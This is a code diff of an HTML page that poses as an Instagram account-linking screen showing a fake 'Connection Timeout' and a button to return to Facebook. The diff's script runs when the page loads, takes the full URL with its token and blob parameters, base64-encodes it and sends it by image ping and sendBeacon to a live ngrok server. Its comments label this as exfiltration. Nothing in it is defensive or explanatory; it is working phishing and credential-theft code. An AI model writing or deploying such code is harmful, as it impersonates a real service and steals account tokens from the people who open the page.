@@ -1,40 +1,40 @@
-<!DOCTYPE html>
+   <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Link Accounts | Instagram</title>
     <style>
-        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; border-radius: 3px; text-align: center; max-width: 350px; width: 90%; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
-        .logo { width: 60px; margin-bottom: 20px; }
-        h2 { font-size: 18px; font-weight: 600; color: #262626; margin: 0 0 10px 0; }
-        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 25px; }
-        .btn { background-color: #0095f6; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; width: 100%; }
+        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; border-radius: 8px; text-align: center; max-width: 350px; }
+        .btn { background-color: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: 600; width: 100%; cursor: pointer; }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="60">
         <h2>Connection Timeout</h2>
-        <p>Your account link request was interrupted. Please return to Facebook to resume the process.</p>
+        <p>Please return to Facebook to resume the process.</p>
         <button class="btn" onclick="goBack()">Return to Facebook</button>
     </div>
 
     <script>
         (function() {
-            // 🎯 YOUR LIVE NGROK ADDRESS
+            console.log("🚀 STARTING EXFIL...");
+            // MAKE SURE THIS MATCHES YOUR PYCHARM TERMINAL EXACTLY
             const pythonServer = "https://bolsteringly-rightish-joan.ngrok-free.dev/log";
-            
-            // Capture the full URL with all parameters (blob, token, etc.)
             const capturedData = window.location.href;
-            
-            // Exfiltrate immediately if data exists
-            if (capturedData.includes('token=') || capturedData.includes('blob=')) {
-                const exfil = new Image();
-                exfil.src = pythonServer + "?data=" + btoa(capturedData);
+            const payload = "?data=" + btoa(capturedData);
+
+            // Method 1: Image Ping
+            const img = new Image();
+            img.src = pythonServer + payload;
+
+            // Method 2: Beacon (More reliable for redirects)
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(pythonServer + payload);
             }
+            
+            console.log("📡 DATA SENT TO: " + pythonServer);
         })();
 
         function goBack() {
